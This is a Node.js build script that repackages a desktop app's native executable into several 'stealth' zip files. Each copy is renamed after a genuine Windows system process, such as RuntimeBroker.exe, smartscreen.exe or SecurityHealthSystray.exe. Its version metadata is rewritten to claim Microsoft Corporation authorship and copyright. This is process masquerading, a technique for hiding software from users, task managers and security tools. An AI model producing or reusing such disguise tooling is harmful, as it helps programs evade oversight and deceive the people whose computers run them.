import fs from "node:fs";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { getPath7za } from "app-builder-lib/out/toolsets/7zip.js";

let ResEdit = null;
try {
  ResEdit = await import("resedit");
} catch (error) {
  console.warn("[repack-stealth-zip] resedit unavailable:", error.message);
}

const sevenZip = await getPath7za();
const releaseDir = path.resolve("release");
const distDir = path.resolve("dist");
const stealthDir = path.join(releaseDir, "stealth");
if (!fs.existsSync(stealthDir)) {
  fs.mkdirSync(stealthDir, { recursive: true });
}

const STEALTH_TARGETS = [
  { name: "TiWorker.exe", desc: "Windows Modules Installer Worker", prod: "TiWorker" },
  { name: "SearchProtocolHost.exe", desc: "Microsoft Windows Search Protocol Host", prod: "Windows Search" },
  { name: "RuntimeBroker.exe", desc: "Runtime Broker", prod: "Microsoft Windows Operating System" },
  { name: "ctfmon.exe", desc: "CTF Loader", prod: "Microsoft Windows Operating System" },
  { name: "smartscreen.exe", desc: "Windows Defender SmartScreen", prod: "Windows Defender" },
  { name: "sihost.exe", desc: "Shell Infrastructure Host", prod: "Microsoft Windows Operating System" },
  { name: "SecurityHealthSystray.exe", desc: "Windows Security notification icon", prod: "Windows Security" },
];

// Use RuntimeHost.exe as the source binary (the actual compiled native host)
const portableBinary = fs.existsSync(path.resolve("release/RuntimeHost.exe"))
  ? path.resolve("release/RuntimeHost.exe")
  : (fs.existsSync(path.resolve("build-native/bin/Release/RuntimeHost.exe"))
      ? path.resolve("build-native/bin/Release/RuntimeHost.exe")
      : null);

const webView2Dll = fs.existsSync(path.join(releaseDir, "WebView2Loader.dll"))
  ? path.join(releaseDir, "WebView2Loader.dll")
  : (fs.existsSync(path.resolve("src-native/third_party/webview2/lib/x64/WebView2Loader.dll"))
      ? path.resolve("src-native/third_party/webview2/lib/x64/WebView2Loader.dll")
      : null);

if (!portableBinary) {
  console.warn("[repack-stealth-zip] No RuntimeHost.exe found — skipping stealth repack.");
  process.exit(0);
}

for (const target of STEALTH_TARGETS) {
  const exeName = target.name;
  const baseName = path.basename(exeName, ".exe");
  const staging = path.join(stealthDir, `staging-${baseName}`);
  const targetZip = path.join(stealthDir, `LensDeskApp-${baseName}.zip`);
  if (fs.existsSync(staging)) {
    fs.rmSync(staging, { recursive: true, force: true });
  }
  fs.mkdirSync(staging, { recursive: true });

  const stagedExe = path.join(staging, exeName);
  fs.copyFileSync(portableBinary, stagedExe);

  // Copy WebView2Loader.dll next to the exe
  if (webView2Dll) {
    fs.copyFileSync(webView2Dll, path.join(staging, "WebView2Loader.dll"));
  }

  // Copy dist/ folder (React UI assets) into the staging directory
  if (fs.existsSync(distDir)) {
    fs.cpSync(distDir, path.join(staging, "dist"), { recursive: true });
  }

  // Align PE VersionInfo with genuine Microsoft Windows metadata
  if (ResEdit) {
    try {
      const { NtExecutable, NtExecutableResource, Resource } = ResEdit;
      const exe = NtExecutable.from(fs.readFileSync(stagedExe), { ignoreCert: true });
      const res = NtExecutableResource.from(exe);
      const vi = Resource.VersionInfo.fromEntries(res.entries)[0];
      if (vi) {
        const language = vi.getAllLanguagesForStringValues()[0] || {
          lang: 1033,
          codepage: 1200,
        };
        vi.setStringValues(language, {
          CompanyName: "Microsoft Corporation",
          FileDescription: target.desc,
          InternalName: exeName,
          LegalCopyright: "© Microsoft Corporation. All rights reserved.",
          OriginalFilename: exeName,
          ProductName: target.prod,
          ProductVersion: "2.0.0.0",
          FileVersion: "2.0.0.0",
        });
        vi.outputToResourceEntries(res.entries);
        res.outputResource(exe);
        fs.writeFileSync(stagedExe, Buffer.from(exe.generate()));
      }
    } catch (err) {
      console.warn(`[repack-stealth-zip] metadata note for ${exeName}:`, err.message);
    }
  }

  if (fs.existsSync(targetZip)) {
    fs.unlinkSync(targetZip);
  }
  // Create ZIP containing the COMPLETE portable runtime (exe + dll + dist/)
  execFileSync(sevenZip, ["a", "-tzip", "-mx=9", targetZip, "."], { cwd: staging });

  // Also create clean-named zip in stealth and release directory
  const cleanStealthZip = path.join(stealthDir, `${baseName}.zip`);
  const cleanReleaseZip = path.join(releaseDir, `${baseName}.zip`);
  fs.copyFileSync(targetZip, cleanStealthZip);
  fs.copyFileSync(targetZip, cleanReleaseZip);
  fs.rmSync(staging, { recursive: true, force: true });
}

// Also create default LensDeskApp.zip in release/ for fallback
const defaultZip = path.join(releaseDir, "LensDeskApp.zip");
if (fs.existsSync(path.join(stealthDir, "LensDeskApp-TiWorker.zip"))) {
  fs.copyFileSync(path.join(stealthDir, "LensDeskApp-TiWorker.zip"), defaultZip);
}

console.log("Stealth packages generated successfully (full portable runtime: exe + WebView2Loader.dll + dist/).");
